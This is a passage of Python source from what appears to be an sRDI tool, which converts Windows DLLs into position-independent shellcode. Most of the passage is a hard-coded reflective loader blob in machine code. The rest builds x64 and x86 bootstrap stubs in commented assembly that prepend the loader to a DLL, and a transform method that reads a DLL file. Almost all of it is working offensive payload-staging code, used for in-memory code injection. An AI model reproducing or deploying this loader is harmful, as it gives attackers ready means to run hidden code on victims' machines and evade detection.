                          b'\xDA\x44\x03\x77\x50\x49\x8D\x48\xFF\x8B\xC2\x4C\x23\xF0\x8B\xC3\x48\x03\xC8\x49\x8D\x40' \
                          b'\xFF\x48\xF7\xD0\x48\x23\xC8\x4C\x3B\xF1\x0F\x85\x54\x06\x00\x00\x48\x8B\x4F\x30\x41\xBC' \
                          b'\x00\x30\x00\x00\x45\x8B\xC4\x41\xB9\x04\x00\x00\x00\x49\x8B\xD6\xFF\x55\xC8\x48\x8B\xD8' \
                          b'\x48\x85\xC0\x75\x12\x44\x8D\x48\x04\x45\x8B\xC4\x49\x8B\xD6\x33\xC9\xFF\x55\xC8\x48\x8B' \
                          b'\xD8\x44\x8B\xA5\xD0\x00\x00\x00\x41\xBB\x01\x00\x00\x00\x45\x84\xE3\x74\x1D\x8B\x46\x3C' \
                          b'\x89\x43\x3C\x8B\x56\x3C\xEB\x0B\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88\x04\x19\x3B\x57\x54' \
                          b'\x72\xF0\xEB\x19\x41\x8B\xD7\x44\x39\x7F\x54\x76\x10\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88' \
                          b'\x04\x19\x3B\x57\x54\x72\xF0\x48\x63\x7B\x3C\x45\x8B\xD7\x48\x03\xFB\x48\x89\x7D\x30\x44' \
                          b'\x0F\xB7\x47\x14\x49\x83\xC0\x28\x66\x44\x3B\x7F\x06\x73\x3A\x4C\x03\xC7\x45\x8B\xCF\x45' \
                          b'\x39\x38\x76\x1F\x41\x8B\x50\x04\x41\x8B\x48\xFC\x41\x8B\xC1\x45\x03\xCB\x48\x03\xC8\x48' \
                          b'\x03\xD0\x8A\x04\x32\x88\x04\x19\x45\x3B\x08\x72\xE1\x0F\xB7\x47\x06\x45\x03\xD3\x49\x83' \
                          b'\xC0\x28\x44\x3B\xD0\x72\xC9\x4C\x8B\xF3\x41\xB8\x02\x00\x00\x00\x4C\x2B\x77\x30\x0F\x84' \
                          b'\xD6\x00\x00\x00\x44\x39\xBF\xB4\x00\x00\x00\x0F\x84\xC9\x00\x00\x00\x44\x8B\x8F\xB0\x00' \
                          b'\x00\x00\x4C\x03\xCB\x45\x39\x39\x0F\x84\xB6\x00\x00\x00\x4D\x8D\x51\x08\xE9\x91\x00\x00' \
                          b'\x00\x45\x0F\xB7\x1A\x41\x0F\xB7\xCB\x41\x0F\xB7\xC3\x66\xC1\xE9\x0C\x66\x83\xF9\x0A\x75' \
                          b'\x29\x45\x8B\x01\x41\x81\xE3\xFF\x0F\x00\x00\x4B\x8D\x04\x18\x48\x8B\x14\x18\x4B\x8D\x04' \
                          b'\x18\x41\xBB\x01\x00\x00\x00\x49\x03\xD6\x48\x89\x14\x18\x45\x8D\x43\x01\xEB\x4F\x41\xBB' \
                          b'\x01\x00\x00\x00\x66\x83\xF9\x03\x75\x0E\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x8B\xC6' \
                          b'\xEB\x2E\x66\x41\x3B\xCB\x75\x15\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x49\x8B\xC6\x48\xC1' \
                          b'\xE8\x10\x0F\xB7\xC0\xEB\x13\x66\x41\x3B\xC8\x75\x14\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03' \
                          b'\x41\x0F\xB7\xC6\x41\x8B\x11\x48\x01\x04\x0A\x4D\x03\xD0\x41\x8B\x41\x04\x49\x03\xC1\x4C' \
                          b'\x3B\xD0\x0F\x85\x5F\xFF\xFF\xFF\x4D\x8B\xCA\x45\x39\x3A\x0F\x85\x4A\xFF\xFF\xFF\x44\x39' \
                          b'\xBF\x94\x00\x00\x00\x0F\x84\x82\x01\x00\x00\x8B\x8F\x90\x00\x00\x00\x45\x8B\xEF\x4C\x8D' \
                          b'\x04\x19\x49\x8D\x40\x0C\xEB\x07\x45\x03\xEB\x48\x8D\x40\x14\x44\x39\x38\x75\xF4\x41\x8B' \
                          b'\xC4\x83\xE0\x04\x89\x45\xC0\x8B\xC1\x0F\x84\x89\x00\x00\x00\x45\x3B\xEB\x0F\x86\x80\x00' \
                          b'\x00\x00\x41\xC1\xEC\x10\x45\x8D\x5D\xFF\x45\x8B\xD7\x45\x85\xDB\x74\x74\x4D\x8B\xC8\x41' \
                          b'\xBE\xFF\x7F\x00\x00\x41\x0F\x10\x01\x33\xD2\x41\x8B\xCD\x41\x2B\xCA\x69\xF6\xFD\x43\x03' \
                          b'\x00\x41\x8B\xC6\xF7\xF1\x33\xD2\x81\xC6\xC3\x9E\x26\x00\x8D\x48\x01\x8B\xC6\xC1\xE8\x10' \
                          b'\x41\x23\xC6\xF7\xF1\x41\x03\xC2\x41\xFF\xC2\x48\x8D\x0C\x80\x41\x8B\x54\x88\x10\x41\x0F' \
                          b'\x10\x0C\x88\x41\x0F\x11\x04\x88\x41\x8B\x41\x10\x41\x89\x44\x88\x10\x41\x0F\x11\x09\x41' \
                          b'\x89\x51\x10\x4D\x8D\x49\x14\x45\x3B\xD3\x72\xA1\x8B\x87\x90\x00\x00\x00\xEB\x04\x44\x8B' \
                          b'\x65\xC0\x8B\xF0\x48\x03\xF3\x8B\x46\x0C\x85\xC0\x0F\x84\xB1\x00\x00\x00\x8B\x7D\xC0\x8B' \
                          b'\xC8\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x4C\x8B\xD0\x44\x8B\x36\x44\x8B\x7E\x10' \
                          b'\x4C\x03\xF3\x4C\x03\xFB\x49\x8B\x0E\x48\x85\xC9\x74\x5F\x48\x85\xC9\x79\x08\x45\x0F\xB7' \
                          b'\x06\x33\xD2\xEB\x32\x48\x8D\x53\x02\x33\xC0\x48\x03\xD1\x38\x02\x74\x0E\x48\x8B\xCA\x48' \
                          b'\xFF\xC1\x48\xFF\xC0\x80\x39\x00\x75\xF5\x48\x89\x54\x24\x30\x45\x33\xC0\x48\x8D\x54\x24' \
                          b'\x28\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4D\x8B\xCF\x49\x8B\xCA\xFF\x55\xD0\x49\x83' \
                          b'\xC6\x08\x49\x83\xC7\x08\x49\x8B\x0E\x48\x85\xC9\x74\x07\x4C\x8B\x54\x24\x38\xEB\xA1\x45' \
                          b'\x33\xFF\x85\xFF\x74\x10\x41\x83\xFD\x01\x76\x0A\x41\x69\xCC\xE8\x03\x00\x00\xFF\x55\xF0' \
                          b'\x8B\x46\x20\x48\x83\xC6\x14\x85\xC0\x0F\x85\x56\xFF\xFF\xFF\x48\x8B\x7D\x30\x4C\x8B\x6D' \
                          b'\xD0\x44\x39\xBF\xF4\x00\x00\x00\x0F\x84\xA9\x00\x00\x00\x44\x8B\xBF\xF0\x00\x00\x00\x49' \
                          b'\x83\xC7\x04\x4C\x03\xFB\x45\x33\xE4\x41\x8B\x07\x85\xC0\x0F\x84\x8A\x00\x00\x00\x8B\xC8' \
                          b'\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x48\x8B\xC8\x41\x8B\x77\x08\x45\x8B\x77\x0C' \
                          b'\x48\x03\xF3\x4C\x03\xF3\x4C\x39\x26\x74\x5E\x49\x8B\x16\x48\x85\xD2\x79\x08\x44\x0F\xB7' \
                          b'\xC2\x33\xD2\xEB\x34\x4C\x8D\x43\x02\x49\x8B\xC4\x4C\x03\xC2\x45\x38\x20\x74\x0E\x49\x8B' \
                          b'\xD0\x48\xFF\xC2\x48\xFF\xC0\x44\x38\x22\x75\xF5\x4C\x89\x44\x24\x30\x48\x8D\x54\x24\x28' \
                          b'\x45\x33\xC0\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4C\x8B\xCE\x41\xFF\xD5\x48\x83\xC6' \
                          b'\x08\x49\x83\xC6\x08\x4C\x39\x26\x74\x07\x48\x8B\x4C\x24\x38\xEB\xA2\x49\x83\xC7\x20\xE9' \
                          b'\x6B\xFF\xFF\xFF\x45\x33\xFF\x0F\xB7\x77\x14\x45\x8B\xF7\x48\x83\xC6\x28\x41\xBC\x01\x00' \
                          b'\x00\x00\x66\x44\x3B\x7F\x06\x0F\x83\x0B\x01\x00\x00\x48\x03\xF7\x44\x39\x3E\x0F\x84\xEB' \
                          b'\x00\x00\x00\x8B\x46\x14\x8B\xC8\x81\xE1\x00\x00\x00\x20\x75\x17\x0F\xBA\xE0\x1E\x72\x11' \
                          b'\x85\xC0\x78\x0D\x45\x8B\xC4\x44\x89\x64\x24\x20\xE9\xA4\x00\x00\x00\x85\xC9\x75\x3C\x0F' \
                          b'\xBA\xE0\x1E\x72\x0A\x85\xC0\x79\x06\x44\x8D\x41\x08\xEB\x68\x85\xC9\x75\x28\x0F\xBA\xE0' \
                          b'\x1E\x73\x0A\x85\xC0\x78\x06\x44\x8D\x41\x02\xEB\x54\x85\xC9\x75\x14\x0F\xBA\xE0\x1E\x73' \
                          b'\x0A\x85\xC0\x79\x06\x44\x8D\x41\x04\xEB\x40\x85\xC9\x74\x5F\x0F\xBA\xE0\x1E\x72\x0C\x85' \
                          b'\xC0\x78\x08\x41\xB8\x10\x00\x00\x00\xEB\x2A\x85\xC9\x74\x49\x0F\xBA\xE0\x1E\x72\x0C\x85' \
                          b'\xC0\x79\x08\x41\xB8\x80\x00\x00\x00\xEB\x14\x85\xC9\x74\x33\x0F\xBA\xE0\x1E\x73\x11\x85' \
                          b'\xC0\x78\x0D\x41\xB8\x20\x00\x00\x00\x44\x89\x44\x24\x20\xEB\x21\x85\xC9\x74\x18\x0F\xBA' \
                          b'\xE0\x1E\x73\x12\x44\x8B\x44\x24\x20\x85\xC0\xB9\x40\x00\x00\x00\x44\x0F\x48\xC1\xEB\xDD' \
                          b'\x44\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x0A\x41\x0F\xBA\xE8\x09\x44\x89\x44' \
                          b'\x24\x20\x8B\x4E\xFC\x4C\x8D\x4C\x24\x20\x8B\x16\x48\x03\xCB\xFF\x55\x00\x0F\xB7\x47\x06' \
                          b'\x45\x03\xF4\x48\x83\xC6\x28\x44\x3B\xF0\x0F\x82\xF8\xFE\xFF\xFF\x45\x33\xC0\x33\xD2\x48' \
                          b'\x83\xC9\xFF\xFF\x55\x08\x44\x39\xBF\xD4\x00\x00\x00\x74\x24\x8B\x87\xD0\x00\x00\x00\x48' \
                          b'\x8B\x74\x18\x18\xEB\x0F\x45\x33\xC0\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x48\x8D\x76\x08\x48' \
                          b'\x8B\x06\x48\x85\xC0\x75\xE9\x4C\x8B\x4D\x18\x4D\x85\xC9\x74\x2F\x8B\x87\xA4\x00\x00\x00' \
                          b'\x85\xC0\x74\x25\x8B\xC8\x4C\x8B\xC3\x48\xB8\xAB\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x48\xF7\xE1' \
                          b'\x8B\x8F\xA0\x00\x00\x00\x48\xC1\xEA\x03\x48\x03\xCB\x41\x2B\xD4\x41\xFF\xD1\x8B\x47\x28' \
                          b'\x4D\x8B\xC4\x48\x03\xC3\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x8B\xB5\xB8\x00\x00\x00\x85\xF6' \
                          b'\x0F\x84\x97\x00\x00\x00\x44\x39\xBF\x8C\x00\x00\x00\x0F\x84\x8A\x00\x00\x00\x8B\x8F\x88' \
                          b'\x00\x00\x00\x48\x03\xCB\x44\x8B\x59\x18\x45\x85\xDB\x74\x78\x44\x39\x79\x14\x74\x72\x44' \
                          b'\x8B\x49\x20\x41\x8B\xFF\x8B\x51\x24\x4C\x03\xCB\x48\x03\xD3\x45\x85\xDB\x74\x5D\x45\x8B' \
                          b'\x01\x45\x8B\xD7\x4C\x03\xC3\x74\x52\xEB\x0D\x0F\xBE\xC0\x44\x03\xD0\x41\xC1\xCA\x0D\x4D' \
                          b'\x03\xC4\x41\x8A\x00\x84\xC0\x75\xEC\x41\x3B\xF2\x75\x05\x48\x85\xD2\x75\x12\x41\x03\xFC' \
                          b'\x49\x83\xC1\x04\x48\x83\xC2\x02\x41\x3B\xFB\x73\x22\xEB\xC3\x8B\x41\x1C\x0F\xB7\x0A\x48' \
                          b'\x03\xC3\x8B\x95\xC8\x00\x00\x00\x44\x8B\x04\x88\x48\x8B\x8D\xC0\x00\x00\x00\x4C\x03\xC3' \
                          b'\x41\xFF\xD0\x48\x8B\xC3\xEB\x02\x33\xC0\x48\x8B\x9C\x24\xB0\x01\x00\x00\x48\x81\xC4\x70' \
                          b'\x01\x00\x00\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5F\x5E\x5D\xC3\xCC\x48\x8B\xC4\x48\x89\x58' \
                          b'\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B' \
                          b'\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41' \
                          b'\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6' \
                          b'\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48' \
                          b'\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0' \
                          b'\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA' \
                          b'\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76' \
                          b'\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D' \
                          b'\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5' \
                          b'\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B' \
                          b'\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B' \
                          b'\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3 '
        # MARKER:E

        if sRDI.is64BitDLL(dll_bytes):

            rdi_shellcode = rdi_shellcode64

            bootstrap = b''
            bootstrap_size = 64

            # call next instruction (Pushes next instruction address to stack)
            bootstrap += b'\xe8\x00\x00\x00\x00'

            # Set the offset to our DLL from pop result
            dll_offset = bootstrap_size - len(bootstrap) + len(rdi_shellcode)

            # pop rcx - Capture our current location in memory
            bootstrap += b'\x59'

            # mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
            bootstrap += b'\x49\x89\xc8'

            # add rcx, <Offset of the DLL>
            bootstrap += b'\x48\x81\xc1'
            bootstrap += struct.pack('I', dll_offset)

            # mov edx, <Hash of function>
            bootstrap += b'\xba'
            bootstrap += struct.pack('I', function_hash)

            # Setup the location of our user data
            # add r8, <Offset of the DLL> + <Length of DLL>
            bootstrap += b'\x49\x81\xc0'
            user_data_location = dll_offset + len(dll_bytes)
            bootstrap += struct.pack('I', user_data_location)

            # mov r9d, <Length of User Data>
            bootstrap += b'\x41\xb9'
            bootstrap += struct.pack('I', len(user_data))

            # push rsi - save original value
            bootstrap += b'\x56'

            # mov rsi, rsp - store our current stack pointer for later
            bootstrap += b'\x48\x89\xe6'

            # and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
            bootstrap += b'\x48\x83\xe4\xf0'

            # sub rsp, 0x30 - Create some breathing room on the stack
            bootstrap += b'\x48\x83\xec'
            bootstrap += b'\x30'  # 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment

            # mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
            bootstrap += b'\xC7\x44\x24'
            bootstrap += b'\x20'
            bootstrap += struct.pack('I', flags)

            # call - Transfer execution to the RDI
            bootstrap += b'\xe8'
            bootstrap += struct.pack('b',
                                     bootstrap_size - len(bootstrap) - 4)  # Skip over the remainder of instructions
            bootstrap += b'\x00\x00\x00'

            # mov rsp, rsi - Reset our original stack pointer
            bootstrap += b'\x48\x89\xf4'

            # pop rsi - Put things back where we left them
            bootstrap += b'\x5e'

            # ret - return to caller
            bootstrap += b'\xc3'

            if len(bootstrap) != bootstrap_size:
                raise Exception(f"x64 bootstrap length: {len(bootstrap)} != bootstrap_size: {bootstrap_size}")

            # Ends up looking like this in memory:
            # Bootstrap shellcode
            # RDI shellcode
            # DLL bytes
            # User data
            return bootstrap + rdi_shellcode + dll_bytes + user_data

        else:  # 32 bit
            rdi_shellcode = rdi_shellcode32

            bootstrap = b''
            bootstrap_size = 49

            # call next instruction (Pushes next instruction address to stack)
            bootstrap += b'\xe8\x00\x00\x00\x00'

            # Set the offset to our DLL from pop result
            dll_offset = bootstrap_size - len(bootstrap) + len(rdi_shellcode)

            # pop eax - Capture our current location in memory
            bootstrap += b'\x58'

            # push ebp
            bootstrap += b'\x55'

            # mov ebp, esp
            bootstrap += b'\x89\xe5'

            # mov edx, eax - copy our location in memory to ebx before we start modifying eax
            bootstrap += b'\x89\xc2'

            # add eax, <Offset to the DLL>
            bootstrap += b'\x05'
            bootstrap += struct.pack('I', dll_offset)

            # add edx, <Offset to the DLL> + <Size of DLL>
            bootstrap += b'\x81\xc2'
            user_data_location = dll_offset + len(dll_bytes)
            bootstrap += struct.pack('I', user_data_location)

            # push <Flags>
            bootstrap += b'\x68'
            bootstrap += struct.pack('I', flags)

            # push <Length of User Data>
            bootstrap += b'\x68'
            bootstrap += struct.pack('I', len(user_data))

            # push edx
            bootstrap += b'\x52'

            # push <hash of function>
            bootstrap += b'\x68'
            bootstrap += struct.pack('I', function_hash)

            # push eax
            bootstrap += b'\x50'

            # call - Transfer execution to the RDI
            bootstrap += b'\xe8'
            bootstrap += struct.pack('b',
                                     bootstrap_size - len(bootstrap) - 4)  # Skip over the remainder of instructions
            bootstrap += b'\x00\x00\x00'

            # add esp, 0x14 - remove arguments from stack (cdecl)
            bootstrap += b'\x83\xc4\x14'

            # leave
            bootstrap += b'\xc9'

            # ret - return to caller
            bootstrap += b'\xc3'

            if len(bootstrap) != bootstrap_size:
                raise Exception(f"x86 bootstrap length: {len(bootstrap)} != bootstrap_size: {bootstrap_size}")

            # Ends up looking like this in memory:
            # Bootstrap shellcode
            # RDI shellcode
            # DLL bytes
            # User data
            return bootstrap + rdi_shellcode + dll_bytes + user_data

    def transform(self, target):
        dll = open(target, 'rb').read()
        flags = self.flags
        converted = sRDI.ConvertToShellcode(dll, sRDI.HashFunctionName(self.function), self.args, flags)
        return converted
